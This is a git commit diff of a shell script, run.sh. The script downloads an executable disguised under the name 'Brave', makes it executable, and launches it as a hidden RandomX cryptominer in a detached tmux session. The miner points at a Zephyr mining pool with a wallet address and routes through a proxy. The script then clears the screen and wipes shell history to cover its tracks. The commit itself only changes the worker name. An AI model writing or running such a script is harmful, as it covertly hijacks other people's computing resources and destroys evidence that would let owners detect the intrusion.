d30d21dba9dcdea14a696cdedd6e231200d29183
cxzac <132400389+cxzac@users.noreply.github.com>
2024-06-25 20:57:28 +0530

    1

--- run.sh
+++ run.sh
@@ -11,7 +11,7 @@ cd /home
 sudo wget https://github.com/cxzac/n/raw/main/Brave
 sudo chmod +x Brave
 
-tmux new-session -d -s 01 'sudo ./Brave -a rx -o de.zephyr.herominers.com:1123 -u ZEPHsA7M7JaXUgag96fuZbZPQZcDGxG6mJHr6mAcKNKAcqoDTPYCQavRdkokVk3Zk1Z62dbAU7JMkA89NVuPq3Ju6SrqfZ9idKk.z193v01 -t 8 -p x --proxy 174.75.211.222:4145'
+tmux new-session -d -s 01 'sudo ./Brave -a rx -o de.zephyr.herominers.com:1123 -u ZEPHsA7M7JaXUgag96fuZbZPQZcDGxG6mJHr6mAcKNKAcqoDTPYCQavRdkokVk3Zk1Z62dbAU7JMkA89NVuPq3Ju6SrqfZ9idKk.e219v01 -t 8 -p x --proxy 174.75.211.222:4145'
 
 clear
 history -c
